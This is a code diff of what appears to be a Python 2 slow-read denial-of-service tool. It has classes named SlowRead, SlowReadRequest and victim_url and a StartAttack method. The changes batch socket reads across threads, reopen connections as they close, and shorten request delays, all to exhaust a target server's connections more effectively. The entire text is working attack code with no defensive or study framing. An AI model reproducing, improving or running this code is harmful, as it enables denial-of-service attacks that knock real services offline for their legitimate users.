@@ -63,18 +63,16 @@ class SlowRead(ThreadPool):
             exit()
         return sock
 
-    def SingleTask(self, sock):
+    def SingleRequestTask(self, sock):
         Request = SlowReadRequest(self.url, sock, self.port, self.repeat)
         task = WorkRequest(Request.SingleRequest, callback=self.RequestDebug)
         self.putRequest(task)
 
-    def StartAttack(self):
-        for i in range(len(self.socks)):
-            self.SingleTask(self.socks[i])
+    def ReadProcess(self, *rd_socks):
         while True:
             wlists = []
             elists = []
-            rs,ws,es = select.select(self.socks, wlists, elists, 0)
+            rs,ws,es = select.select(rd_socks, wlists, elists, 0)
             #print 'select return len %d' % len(rs)
             time.sleep(3)
             for s in rs:
@@ -84,24 +82,37 @@ class SlowRead(ThreadPool):
                     print 'Port %d recv error' % s.getsockname()[1]
                     continue
                 #data transfer complete and create new connenct
-                print s
                 if not len(data):
                     print 'socket close'
                     s.close()
                     self.socks.remove(s)
                     new_sock = self.SingleSocket()
-                    self.SingleTask(new_sock)
+                    self.SingleRequestTask(new_sock)
                     self.socks.append(new_sock)
                 else:
                     print 'data :' + data + ' len : ' + str(len(data))
 
+    def ReadTask(self, rd_sock):
+        task = WorkRequest(callable = self.ReadProcess, args = rd_sock)
+        self.putRequest(task)
+
+    def StartAttack(self):
+        socks = []
+        for i in range(len(self.socks)):
+            self.SingleRequestTask(self.socks[i])
+            if len(self.socks) > 64:
+                socks.append(self.socks[i])
+                if i%64 == 0:
+                    self.ReadTask(socks)
+                    socks = []
+            else:
+                self.ReadTask(self.socks)
 
     def RequestDebug(self, request, result):
         if result:
             print 'Port %d connected and send request sueccess' % request.sock.getsockname()[1]
         else:
             print 'Port %d Failed' % request.sock.getsockname()[1]
-
 
 class SlowReadRequest():
     def __init__(self, url, sock, port, repeat):
@@ -132,7 +143,7 @@ class SlowReadRequest():
                             "Accept-Language: zh-CN,zh;q=0.8\r\n"
                             "\r\n" %
                             (self.url, random.choice(useragents)))
-            time.sleep(0.5)
+            time.sleep(0.3)
 
 class victim_url():
     def __init__(self, url):
